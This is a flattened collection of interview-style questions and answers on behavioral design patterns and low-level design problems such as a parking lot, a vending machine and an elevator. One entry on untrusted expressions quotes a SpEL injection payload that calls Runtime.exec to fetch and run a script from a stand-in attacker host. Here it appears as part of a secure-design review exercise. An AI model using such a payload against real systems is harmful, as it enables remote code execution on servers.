text: Model it with a Mediator, show the shape, and explain how you keep the mediator from becoming a god class and how you test it. A flight-search form has 12 widgets origin, destination, dates, one-way toggle, passengers, promo, submit... . Every widget calls other widgets directly; a recent change to "one-way" broke the return-date validation and nobody can predict side effects. Unit tests need a full screen.

title: State pattern basics
text: What is the State pattern and what smell does it remove? An object's behaviour depends on its current state. Instead of if status == X in every method, each state is a class that implements the behaviour, and the context delegates to its current state object. Transitions swap that object. It kills the repeated switch over a status field.

title: Command basics
text: What is the Command pattern and why would you wrap a request in an object? Command turns a request into an object with execute . Because it is an object I can queue it, log it, retry it, schedule it, pass it around and undo it. The invoker does not know what the command does; the receiver does the work.

title: State vs Strategy
text: State and Strategy have the same class diagram. How do you tell them apart? The structure is identical: a context delegating to an interface. The difference is who changes the object and why. With Strategy the client picks the algorithm and it rarely changes. With State the object changes its own state object as events happen, and states often know about each other transitions .

title: Undo mechanism
text: How do you implement undo/redo with Command? Compare storing an inverse versus a snapshot. Each command has execute and undo . An undo stack holds executed commands; undo pops, calls undo , and pushes to a redo stack; a new action clears the redo stack. For undo either store the inverse operation compact or a memento snapshot of prior state simple, larger .

title: Status switch to State
text: Refactor and explain what changes when "On Hold" is added. Order has String status and four methods, each with a switch over six statuses. Last month cancel was patched but refund was not, and a shipped order was refunded twice. void cancel { switch status { case "CREATED": status = "CANCELLED"; break; case "PAID": refund ; status = "CANCELLED"; break; case "SHIPPED": throw new IllegalStateException ; // 3 more cases } }

title: Illegal transition
text: Find the bug and describe a design that makes this class of bug hard. A vending-machine class allows free drinks: support reports a drink dispensed with no payment after a user pressed "refund" then "select" quickly. Code: enum S { IDLE, HAS MONEY, DISPENSING } S s = S.IDLE; void insertCoin { s = S.HAS MONEY; } void refund { giveBackCoins ; / forgot: s = S.IDLE / } void select { if s == S.HAS MONEY { s = S.DISPENSING; dispense ; s = S.IDLE; } }

title: Adding a state
text: What changes and what does not? What new risks appear? A video upload has states Queued, Uploading, Done, Failed with State classes. Product wants Paused user taps pause , resumable from the byte offset, and auto-pause when the network drops.

title: Over-engineering State
text: Do you accept the State-pattern version? What would you do? A teammate proposes State classes Loading, Loaded, Error with a context and factory for a screen that has three display modes and no transition logic beyond "request finished". In Kotlin they could use a sealed class.

title: Undo in an editor
text: Fix memory, UX, and the redo bug. A text editor with 50 MB documents needs undo/redo and macro recording. Typing 100 characters creates 100 commands; the history grows to 1.2 GB after a long session; users complain that Ctrl+Z removes one letter at a time and redo vanishes after they undo twice and type.

title: Concurrent transitions
text: Explain and fix the race at the code and database level. Orders are cancelled by customers and shipped by the warehouse service concurrently. Production: 0.2% of orders end up "SHIPPED" and refunded. Log excerpt: 12:00:01.120 order=991 cancel state=PAID - CANCELLED refund issued 12:00:01.123 order=991 ship state=PAID - SHIPPED label printed The state is a field read then written without synchronisation across two services' threads.

title: Command queue and retries
text: Diagnose both problems and redesign the commands. A mobile app queues UploadPhoto commands offline-first and replays when online. After a connectivity flap, support sees duplicate posts: queue shows UploadPhoto 771 executed 3 times. Logs: POST /photos 200 client timeout 10s x3. Commands capture a Bitmap and the user's current albumId via a shared mutable Session object; some uploaded photos landed in the wrong album.

title: Testing state and commands
text: Fix macro semantics and describe a test strategy without the canvas. A drawing tool has MacroCommand a list of commands with undo. Users report that undoing a failed macro leaves shapes half-created: step 3 of 5 throws, steps 1-2 stay. Tests exist only for single commands and use a real canvas that needs a GPU.

title: Chain of Responsibility basics
text: What is the Chain of Responsibility pattern, and what problem does it solve? I pass a request along a line of handlers. Each handler either deals with it or hands it to the next one. The sender does not know who will act, so I can add, remove or reorder handlers without touching the sender. I reach for it when the handler is decided at runtime, like expense approval, validation steps or HTTP middleware.

title: Chain in real systems
text: Where does Chain of Responsibility show up in real frameworks, and why does handler order matter? OkHttp interceptors, servlet and Spring filters, Express/Ktor middleware and Android touch dispatch are all chains. Each step calls chain.proceed or next , and the response travels back through the same steps in reverse. Order matters because a step only sees what earlier steps did: logging before auth misses the Authorization header, logging after it prints the secret.

title: Refactor if/else to chain
text: How do you restructure it, and what classes change when the next rule arrives? A leave-approval method in an HR service: void approve Leave l { if l.days <= 2 lead.approve l ; else if l.days <= 10 manager.approve l ; else if l.days <= 30 director.approve l ; else throw new IllegalArgumentException ; } Product now wants "HR review" inserted for leaves over 10 days and a different order for contractors. The same ladder is copy-pasted in 3 controllers.

title: Handler swallowing requests
text: Find the bug s and fix them. An Android app added a caching interceptor. After release, 3% of calls to /profile never complete and the spinner spins forever; no exception is logged. class CacheInterceptor private val cache: Cache : Interceptor { override fun intercept chain: Interceptor.Chain : Response { val req = chain.request val hit = cache.get req.url.toString if hit != null return hit val res = chain.proceed req chain.proceed req // "warm the cache" for next time cache.put req.url.toString , res return res } } Crash reports show IllegalStateException: network interceptor must call proceed exactly once for some users; others just see duplicate POSTs on the server.

title: Order of filters
text: Diagnose and fix. What do you say about the chain design? A Spring API runs filters in this order: JwtAuthFilter verifies RS256 signature, 2 ms - RateLimitFilter Redis counter, 0.3 ms - Logging . A credential-stuffing bot sends 20,000 req/s with garbage tokens. Metrics: cpu user 98% http 429 rate 0.4/s jwt verify p99 40 ms queued redis ops 0.1k/s Legit users see 5 s latencies. A teammate suggests scaling out to 40 pods; another blames Redis.

title: When a chain is the wrong tool
text: Evaluate the design. What would you keep, replace, and why? A notification service handles 14 message types. A new engineer builds a chain of 14 handlers; each checks msg.type == X and passes on otherwise. Metrics: p99 dispatch 4 ms under 8,000 msg/s; support asks "who handled message 8812?" and nobody can say. A second requirement arrives: every message must also be audited and counted, regardless of type.

title: Iterator vs Iterable
text: What is the Iterator pattern, and what is the difference between Iterable and Iterator ? Iterator walks a collection element by element without exposing how it is stored. Iterable is the collection side: it hands out a fresh Iterator each time iterator is called. An Iterator is one single-use traversal with hasNext and next . That is why a for-each loop works on any Iterable , and why two loops can run over the same list independently.

title: ConcurrentModificationException
text: Why does it fail, why do tests pass, and what is the right fix? A cleanup job runs on a single thread and sometimes crashes in production but not in tests: void purge List<Session sessions { for Session s : sessions { if s.isExpired sessions.remove s ; } } Stack trace: java.util.ConcurrentModificationException at ArrayList$Itr.checkForComodification . A colleague says "there must be another thread" and wraps the list in Collections.synchronizedList ; the crash continues. In tests the list has 1 expired item.

title: Lazy vs eager pipelines
text: How would you fix it, and what are the contract risks of changing it? An Android screen shows the first 3 valid names from a cached list of 1,000,000 items. The code: val first3 = bigList.filter { it.isValid }.map { it.name }.take 3 Profiler: 2,000,000 lambda calls, two intermediate lists of about 8 MB each in references, GC pauses of 40 ms, screen opens in 600 ms. Elsewhere the team already uses Files.lines on the JVM backend.

title: Index-based chain
text: How is an interceptor chain implemented with an index, as in OkHttp, and why is that better than linked handler objects? The chain holds a list of handlers and an index . proceed req builds a new chain with index + 1 and calls the handler at the current index. Handlers do not store a next pointer, so they are stateless and reusable across threads, and the order is plain list order, easy to log and assert in a test.

title: Resource-backed iterators
text: Diagnose both problems and redesign. An Android app crashes with OutOfMemoryError on low-end devices 2 GB RAM, 256 MB heap limit when opening "Order history" for power users with 50,000 rows. Later, a different build logs a warning: Cursor finalized without prior close . The code: fun loadOrders : List<Order { val c = db.rawQuery "SELECT FROM orders", null val out = mutableListOf<Order while c.moveToNext out += Order.from c return out // cursor never closed } Heap dump: 50,000 Order objects with embedded 2 KB notes strings, about 100 MB. The UI shows 20 rows at a time.

title: Exposing iteration in an API
text: How do you migrate without breaking all 30 modules at once, and what contract do you publish? A Catalog class used by 30 modules exposes public List<Product products an ArrayList . Requirements change: products must now come from a lazily paged remote source, and ordering must be by relevance. Modules do catalog.products.add ... , get i , and for-each. Some modules sort it in place.

title: Memento basics
text: What is the Memento pattern and who are the originator and the caretaker? Memento captures an object's internal state in a snapshot so it can be restored later. The originator creates and reads the snapshot; the caretaker only stores snapshots and never looks inside. That keeps the originator's private layout hidden, so adding a field changes only the originator.

title: Shallow snapshot bug
text: What is wrong and how do you fix it? A drawing app's undo "does not undo the last stroke". Reproduction: draw 3 strokes, undo twice, you still see strokes 2 and 3 modified. Code: class Canvas { private final List<Stroke strokes = new ArrayList< ; Memento save { return new Memento strokes ; } void restore Memento m { strokes.clear ; strokes.addAll m.strokes ; } static class Memento { final List<Stroke strokes; Memento List<Stroke s { strokes = s; } } } Stroke has setColor and addPoint ; the history stack holds 50 mementos.

title: Saved state limits
text: What happened, and how should state be saved across configuration change and process death? An Android photo-editor crashes when the user rotates the phone or backgrounds the app after applying filters: android.os.TransactionTooLargeException: data parcel size 1048920 bytes at android.app.servertransaction.ActivityTransactionItem... Crashes affect 1.2% of sessions on mid-range phones. The activity does outState.putParcelable "bitmap", editedBitmap and outState.putSerializable "history", undoStack a stack of 20 bitmaps . QA only tested with small images.

title: Undo memory cost
text: Redesign undo. Compare Memento and Command, and say what you would ship. A CAD web app keeps a 40 MB model in memory. Undo is implemented as a full-copy Memento after every edit. Users do 300 edits per session. Metrics: heap at 12 GB per tab after 5 minutes of heavy editing; tab crashes at about 250 edits on 4 GB laptops. Each edit changes under 1 KB of the model. A teammate wants to cap history at 10 steps; product refuses "designers need 200 steps" .

title: Visitor and double dispatch
text: Explain the Visitor pattern and double dispatch. Why do we need accept ? Visitor lets me add operations to a class hierarchy without editing the classes. The operation lives in a visitor object with one visit method per element type. Java picks an overload by the static type of the argument, so a call from outside sees only Shape . accept lets the element call visitor.visit this where this has its real static type, so the right method is chosen by two types: element and visitor. That is double dispatch.

title: Refactor instanceof chains
text: Which pattern fits, and what would you change? Show the Java and the Kotlin approach. An invoice module has Item subtypes Product , Service , Discount . Four utility methods each do an instanceof chain: price Item , toJson Item , tax Item , validate Item . Every quarter, finance requests a new report operation a toCsv , audit . Item types have not changed in 3 years. double tax Item i { if i instanceof Product p return p.price 0.18; else if i instanceof Service s return s.fee 0.12; else if i instanceof Discount d return 0; throw new IllegalArgumentException ; }

title: When not to use Visitor
text: When would you NOT use Visitor? Explain the expression problem. Visitor makes new operations cheap and new types expensive. If the element hierarchy changes often, every new type means editing every visitor, so I use plain polymorphism instead. With one or two operations a polymorphic method is simpler. With Kotlin sealed classes or Java 21 pattern switch, an exhaustive when does the job with compiler checks and no double dispatch. And if the visitor needs private state, Visitor forces me to expose it.

title: A new element type arrives
text: What changes, what would you do about the cost, and what would you have designed differently? A document exporter uses NodeVisitor with visit Paragraph , visit Heading , visit Image . There are 9 visitors HTML, PDF, plain text, spell check, word count, accessibility, search index, ... . Product asks for a Table node and, next quarter, Video and Chart . Estimated effort: 9 visitors x 3 new nodes = 27 edits, and two visitors live in other teams' repos.

title: Interpreter basics
text: What is the Interpreter pattern and when is it a good fit? Interpreter models a small language as a class hierarchy, one class per grammar rule, and evaluates a sentence by walking its tree. A parser builds the tree; each node has interpret context . It fits small stable grammars: filters, rule expressions, permission checks. For big grammars I use ANTLR or an embedded scripting engine, and I cache parsed trees instead of reparsing each request.

title: Rule engine performance
text: How do you fix it? Should the rule language change? A marketing rule engine evaluates rules like cart.total 500 AND user.city IN "Pune","Delhi" for every request. 40 active rules, 5,000 req/s. The service hand-parses each rule string with regexes per request. Profile: RuleEngine.parse 31% CPU Pattern.compile 14% CPU RuleEngine.evaluate 3% CPU p99 latency 85 ms SLO 30 ms Rules change maybe twice a day via admin UI. Someone proposes rewriting in Groovy "so it is fast".

title: Untrusted expressions
text: What is wrong and how do you design it safely? A feature lets customers write notification conditions in an admin console. Review this: ExpressionParser parser = new SpelExpressionParser ; boolean matches String userExpr, Order order { return parser.parseExpression userExpr .getValue order, Boolean.class ; } A pen-tester submits T java.lang.Runtime .getRuntime .exec 'curl evil.sh sh' and a second input of 10,000 nested parentheses. The service runs with access to the production database.

title: Immutability enabling undo
text: Sketch the design and justify the key decision that makes undo, printing and thread-safety simple. You are asked to design a small calculator app with: expressions as trees, operations "evaluate", "pretty-print" and later "simplify", plus unlimited undo of expression edits. A junior's draft uses mutable node classes with setLeft / setRight , copies the whole tree on every edit for undo, and an instanceof chain for printing. Users edit expressions of up to 2,000 nodes; 100 undo steps.

title: Null Object basics
text: What is the Null Object pattern, and how does it differ from returning null or Optional ? Null Object is a do-nothing implementation of an interface that I hand out instead of null . The caller just calls the method and the null object does a harmless default, so there are no if x != null checks to forget. I use it when doing nothing is the correct behaviour, like an optional logger or analytics tracker. If absence is meaningful and the caller must react, I use Optional , a nullable type or a sealed result; if it is a bug, I fail fast.

title: Null Object hiding failure
text: What went wrong with the pattern choice, and what should the code do? In a code review you see this change meant to "fix a crash in the test environment": class NullPaymentGateway implements PaymentGateway { public PaymentResult charge Order o { return PaymentResult.success "n/a" ; } } @Bean PaymentGateway gateway @Value "${pay.url:}" String url { return url.isBlank ? new NullPaymentGateway : new HttpPaymentGateway url ; } Two weeks later finance reports 214 orders marked "paid" with no money collected; a deploy lost the pay.url environment variable.

title: Optional dependency and testing
text: How would you restructure analytics so call sites are clean, debug builds are safe and tests can verify events? An Android app calls analytics?.track "checkout started" in 60 places; in 7 of them a developer forgot ?. after making analytics nullable in a refactor and used !! , giving crashes in debug builds where analytics is disabled. Unit tests need to assert which events fired. Release uses Firebase.

title: Which kind of nothing
text: For each, what do you return and why? Where would Null Object be wrong? A review comment says "use Null Object everywhere to avoid nulls". Three places in the codebase: 1 findUser id returns null when not found and the controller returns 404; 2 getDiscount user returns null when there is no discount, callers then if d != null total -= d.amount ; 3 getReviews productId returns null if none exist, three callers crash on .size .

title: Specification pattern
text: What is the Specification pattern, and how is it different from Strategy and from Predicate ? Specification wraps a business rule in an object with isSatisfiedBy candidate and lets me combine rules with AND, OR and NOT. Instead of long conditions with flags, I compose small named rules that are individually testable and reusable for validation, selection and construction. It differs from Strategy because a spec answers yes or no about a candidate and combines, while a strategy computes something. java.util.function.Predicate already gives and / or / negate ; I add a custom Spec for domain naming or SQL translation.

title: Refactor boolean-flag filters
text: Refactor it. What classes appear, and what happens when the next filter arrives? A UserRepository.find boolean premium, boolean oldAccount, boolean notBlocked, String city, Integer minAge, ... has 8 parameters; callers pass null / false for most. A 9th filter "has verified email" arrives; 14 callers use positional arguments and two tests broke after the last addition. The query is in memory over all about 200,000 users .

title: Specification at scale
text: Fix it while keeping the benefits of composable rules. An admin search uses in-memory Spec<Order composition over orderRepo.findAll . Table: 1,000,000 orders, about 500 B each. heap used admin pod 3.2 GB of 4 GB GC pause p99 1.8 s search latency p50 6.5 s db rows scanned 1,000,000 per search searches per minute 40 A teammate proposes "cache all orders in memory"; another proposes more pods.

title: Look-alike patterns
text: Behavioral patterns look the same on a class diagram. How do you tell Strategy from State, Observer from Mediator, and Chain from Decorator? The shape is an interface plus implementations; the difference is who decides and what changes. Strategy: the client picks an algorithm and rarely swaps it. State: the object moves itself between states, and states know each other. Observer: the subject broadcasts with no logic; Mediator: a hub coordinates with logic. Chain: a handler may stop the request; Decorator always forwards and augments.

title: Strategy vs State misuse
text: Name the right pattern, fix the code, and explain the difference. A developer modeled an order lifecycle as "Strategy": class Order { private OrderBehavior behavior = new CreatedBehavior ; void setBehavior OrderBehavior b { this.behavior = b; } // public void ship { behavior.ship this ; } } // Somewhere in a controller: order.setBehavior new DeliveredBehavior ; order.ship ; // allowed? ships a delivered order Incident: 17 orders shipped twice after a retry path called setBehavior directly. Metrics: duplicate shipments 0.4% of orders; no exceptions logged.

title: Pattern selection for a checkout
text: Which patterns do you pick for which part, and what do you deliberately NOT build yet? Design the behavioral side of a checkout: 3 promo types today percentage, flat, buy-one-get-one with 12 expected in a year; 2 payment gateways with identical authorise-capture-notify steps but different API calls; order lifecycle Created, Paid, Shipped, Delivered, Cancelled; email and analytics on every state change; cart edits with undo. Time: 4 weeks, 3 engineers. An architect says "use all the GoF patterns for future-proofing".

title: Android feed pattern map
text: Which proposals do you accept, replace or reject, and with what platform-native mechanisms? You are reviewing an Android feed screen design doc. It proposes: a Mediator class coordinating network, DB, UI and analytics; a Visitor over Post types text, image, video: stable for 2 years ; Memento in a custom class for scroll position; a hand-written iterator for pagination; a custom LogSpec and analytics with if BuildConfig.DEBUG checks. App must survive rotation and process death, retry failed calls with auth, and let users filter by chips.

title: Lightest mechanism first
text: How do you decide whether a problem deserves a design pattern at all, or just a function, an enum or a sealed class? I pick the lightest mechanism that handles the current variants: a function, then an enum with behaviour, then a sealed class, then a pattern. Strategy usually pays off at about 4 to 5 real variants, or sooner when I need per-variant tests, undo or queuing. Moving up enum to Strategy is a cheap refactor; removing a pattern that call sites depend on is expensive, so under-building first is the safer error.

title: Ticket holds the spot
text: In a parking lot design, why does the Ticket hold a reference to its Spot instead of just a spot id? And why is VehicleType an enum rather than a Car/Bike/Truck class hierarchy? If the ticket holds the spot, unpark is O 1 : look up the ticket by id in a map, flip taken on the spot it points to. With only an id I would scan all spots or keep a second map. The enum is enough because only the size matters; a Car class with no different behaviour is noise. I would introduce subclasses only when vehicles behave differently.

title: Strategy, Facade, and why not Singleton
text: Which patterns do you use in the parking lot and what real change does each one absorb? Why do many answers make ParkingLot a Singleton and why is that a problem? Strategy for spot choice and for pricing, because both change independently of the lot nearest, tightest fit, weekend rates . Facade because callers should see only park and unpark , not spots and tickets. I avoid Singleton: it hides shared state, makes tests leak into each other and blocks multiple lots. I pass the lot in through the constructor.

title: Lock only on park
text: Find every concurrency bug and fix it without making the whole lot a single global lock bottleneck. A teammate "made the lot thread-safe". Two entry gates and one exit gate call it from different threads. In the pilot, the display board occasionally shows 2 cars on spot 7. Languages: Java, Kotlin tab class ParkingLot { private final List<Spot spots; private final SpotStrategy strategy; private final Map<String, Ticket active = new HashMap< ; private int seq = 0; synchronized Optional<Ticket park String plate, VehicleType v, long now { Optional<Spot pick = strategy.pick spots, v ; if pick.isEmpty return Optional.empty ; pick.get .taken.set true ; Ticket t = new Ticket "T" + ++seq , pick.get , plate, now ; active.put t.id, t ; return Optional.of t ; } long unpark String id, long now { // not synchronized Ticket t = active.remove id ; t.spot.taken.set false ; return fee t, now ; } } tab class ParkingLot private val spots: List<Spot , private val strategy: SpotStrategy { private val active = HashMap<String, Ticket private var seq = 0 @Synchronized fun park plate: String, v: VehicleType, now: Long : Ticket? { val s = strategy.pick spots, v ?: return null s.taken.set true return Ticket "T${++seq}", s, plate, now .also { active it.id = it } } fun unpark id: String, now: Long : Long { // not synchronized val t = active.remove id !! t.spot.taken.set false return fee t, now } }

title: Hour boundary and money
text: What is wrong, what does the correct computation look like, and what would you test? Support tickets say customers are charged 0 for stays under an hour and are undercharged on stays like 2h10m. Car rate is 30 per hour. Finance wants "per started hour, minimum one hour". Languages: Java, Kotlin tab long fee VehicleType v, long durationMs { long hours = durationMs / 3 600 000; // integer division return hours perHour.get v ; } tab fun fee v: VehicleType, durationMs: Long : Long { val hours = durationMs / 3 600 000 return hours perHour.getValue v } A second engineer proposes Math.ceil durationMs / 3 600 000.0 rate as a double.

title: Display board drift
text: Run the post-incident review: what happened, what is the right design for the "free per type" counter, and what do you add so it cannot drift again? The entrance board shows "Car spots free: 14". A security guard sees the lot is full. Next week the free counter is added as a plain int incremented in park and decremented in unpark ; after 2 weeks the board shows -3.

title: Why State pattern
text: Why model a vending machine with the State pattern instead of one class with if state == ... in every method? Walk through the transitions. The same user action means different things in different states: inserting money in Idle starts a session, selecting in Idle is an error, selecting in HasMoney dispenses. With State, the machine delegates each action to the current state object and that object decides and switches the state, so there is no growing switch in every method. Adding a state such as out-of-service is a new class, not edits in five methods.

title: State vs Strategy
text: State and Strategy have the same class diagram. What is the real difference, and which one is the vending machine? Both delegate to an interface. In Strategy the caller picks the algorithm and it does not change by itself pricing rule, spot choice . In State the object switches its own behaviour as it moves through a lifecycle, and the state objects know about each other. The vending machine is State: the state decides what the next state is. Change-making for coins is a Strategy inside it.

title: Order of checks
text: What is wrong, and how do you restructure so that a failed purchase changes nothing? Customers say: "I put in 30, chose Cola 40 , it said need 10 more, and the slot count dropped anyway." After three such attempts the slot shows sold out with 3 colas physically inside. Languages: Java, Kotlin tab public void select VendingMachine m, String code { Product p = m.catalog.get code ; m.stock.merge code, -1, Integer::sum ; // reserve the item if m.stock.get code < 0 throw new IllegalStateException "sold out " + code ; if m.balance < p.price throw new IllegalStateException "need " + p.price - m.balance + " more" ; m.dispense code ; m.state = new IdleState ; } tab fun select code: String { val p = catalog code !! stock code = stock.getValue code - 1 // reserve the item check stock.getValue code = 0 { "sold out $code" } check balance = p.price { "need ${p.price - balance} more" } dispense code ; state = Idle }

title: Making change

Market B adds a locally issued set 1, 3, 4. An engineer implements greedy change largest coin first . A user pays 10 for an item costing 4: change 6 in market B. Greedy gives 4 + 1 + 1 3 coins ; the optimal is 3 + 3 2 coins . Worse, with only one 4-coin and one 1-coin left, greedy fails to make 6 even though 3 + 3 exists.

title: Fleet stock
text: Why can the quantity go negative, and what is the right design for reserve, expiry and a jammed motor? 5,000 networked machines report sales to a backend that keeps remaining stock per slot and also accepts a mobile "reserve and pay" feature. Mobile reserves allow 2 users to reserve the last Cola from the same machine. Backend stock for one slot reads -2. Peak is 300 reservation requests per second fleet-wide; each machine slot gets under 1 per minute normally, but a promotion sends 40 requests per second to 3 machines. SELECT machine id, slot, qty FROM stock WHERE qty < 0; -- m-0412 A1 -2 The code: qty = SELECT qty ...; if qty 0 UPDATE stock SET qty = qty - 1 ... .

title: Testing
text: How do you restructure for testability and which cases do you cover? A PR adds timeout refunds. The test uses Thread.sleep 61 000 and runs in CI 40 times per day; it fails 1 in 20 runs. A reviewer also asks you for tests of "motor jams after charging" and "20 threads buy 3 items".

title: SCAN and TreeSet
text: Why does an elevator keep its stops in a sorted set and continue in one direction instead of serving requests first come first served? FCFS zigzags: with stops 5, 2, 8 from floor 0 it travels 5 + 3 + 6 = 14 floors; SCAN goes up serving 2, 5, 8 and travels 8. A TreeSet gives higher floor and lower floor in O log n to answer "is anything ahead?", and de-duplicates repeated button presses. The elevator keeps its direction while stops remain ahead, then reverses.

title: Cost function and dispatcher
text: How does the dispatcher choose which elevator serves a hall call, and which pattern would you extract from it? Each elevator returns a cost for a floor, direction request: distance, plus a penalty when it is heading the wrong way or has a long queue. The dispatcher picks the lowest cost and adds the stop. I extract a DispatchStrategy nearest, least loaded, zone based so the rule is replaceable. It is greedy at call time, which is simple and testable.

title: Non-atomic dispatch
text: Why does one car get all the calls even though every elevator method is synchronized? With 3 cars, a morning rush produced these assignment metrics: car 1 got 91 percent of hall calls in 5 minutes, p99 wait went from 22 s to 80 s. Code: Languages: Java, Kotlin tab class Dispatcher { Elevator call int floor, Direction want { // no lock Elevator best = cars.get 0 ; for Elevator e : cars if e.cost floor, want < best.cost floor, want best = e; best.addStop floor ; // elevator methods are synchronized return best; } } tab class Dispatcher private val cars: List<Elevator { fun call floor: Int, want: Direction : Elevator = cars.minByOrNull { it.cost floor, want }!!.also { it.addStop floor } // Elevator methods @Synchronized }

title: Starvation
text: What is the problem, and how do you fix it without wrecking the average? In a 40-floor tower, complaints: "a person on floor 38 waited 6 minutes". Data for one car: t=0 car at 5 going UP, stops {7, 9, 12, 38} t=20s new hall calls 8, 10, 11, 13 appended nearer the car t=60s new hall calls 14, 15, 16 ... arrivals every 10 s on floors 6 to 20 car keeps serving nearer floors; 38 stays in the set Average wait is 28 s fine ; p99 is 6 min.

Morning rush: 1,200 hall calls per minute, mostly from the lobby going up. The cost uses dist + 20 + stops.size for a car going the wrong way. Simulation shows many cars bunched near the lobby and p99 wait of 95 s. Example: car A at floor 10 going UP with 6 stops; a hall call DOWN at floor 5. Car B is idle at floor 70.

title: Testing with step()
text: How do you design the tests and what do you assert? Tests drive the elevator with Thread.sleep 1000 per floor and a background thread; the suite takes 14 minutes and fails 8 percent of the time. You must add tests for direction reversal at 8 then a call at 6 , idle behaviour, and the 30-calls-3-cars concurrency case.

title: One jump map
text: Why model snakes and ladders as a single from - to map on the board instead of separate Snake and Ladder classes? What must the board validate? A snake and a ladder do the same thing: if you land on from , you end on to ; only the direction differs. One map means fewer classes and portals come free. Separate classes pay off only if they behave differently, for example a snake animation. The board validates in its constructor: no jump from square 1 or the last square, no jump to itself, squares inside the board, and no chain where a jump's target is another jump's start.

title: Injected dice
text: Why is Dice an interface injected into Game , and what does each of Strategy, single responsibility and an immutable board buy you here? The game must not know where numbers come from. With a Dice interface I inject a scripted dice in tests deterministic , a cryptographically strong random on the server so clients cannot cheat, or two dice later. Board answers "where do I end up", Game owns turn order and winner, Dice owns randomness, so each is testable alone. The board is immutable so it can be shared.

title: Finish rule
text: Find the bugs and write the correct rule. Board size 100. QA reports: a player on 97 who rolls 3 never wins; another on 99 rolls 2 and teleports to square 101 and the game keeps going. The code: Languages: Java, Kotlin tab String takeTurn { String p = players.get turn ; int roll = dice.roll ; int target = pos.get p + roll; if target < board.size { // allow move pos.put p, board.resolve target ; } else { pos.put p, target ; // "reached the end" winner = p; } turn = turn + 1 % players.size ; return p + " - " + pos.get p ; } tab fun takeTurn : String { val p = players turn val roll = dice.roll val target = pos.getValue p + roll if target < board.size pos p = board.resolve target else { pos p = target; winner = p } turn = turn + 1 % players.size return "$p - ${pos p }" }

You review the constructor, which only checks from < size and to = 1 . On a server handling roll requests from phones, support reports "player B played twice in a row" and "two winners announced". Log excerpt for game g-77: 12:00:01.120 g-77 req r1 player=A roll=4 pos 17- 21 12:00:01.121 g-77 req r2 player=A roll=6 pos 17- 23 <- same player, same position read 12:00:01.121 g-77 winner=A announced 12:00:01.124 g-77 winner=B announced Each phone sends "roll" and retries on timeout after 2 s. takeTurn has no lock. The Board is immutable.
